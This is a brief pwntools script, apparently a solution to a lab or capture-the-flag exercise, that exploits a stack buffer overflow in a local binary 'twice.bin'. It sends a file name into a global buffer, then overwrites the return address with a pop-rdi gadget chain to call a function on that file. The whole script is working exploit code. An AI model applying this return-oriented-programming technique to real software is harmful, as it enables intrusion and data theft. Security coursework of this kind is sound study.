#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./twice.bin")

    # You can obtain the information (address) of gadgets for %rdi as follow.
    print(p.recvuntil(b"Input your message in global buffer: "))
    p.send(b"secret.txt")
    rdi_gadget=p64(0x4012b3)
    print(p.recvuntil(b"Input your message in stack buffer: "))
    print(b"A"*0x28 + rdi_gadget +p64(0x404080)+p64(0x401156))
    p.sendline(b"A"*0x28 + rdi_gadget +p64(0x404080)+p64(0x401156))
    print(p.recvline())
    # You can use this line to pause the script for a while.
    # input("Attach GDB now and press enter... ")

    



if __name__ == "__main__":
    exploit()
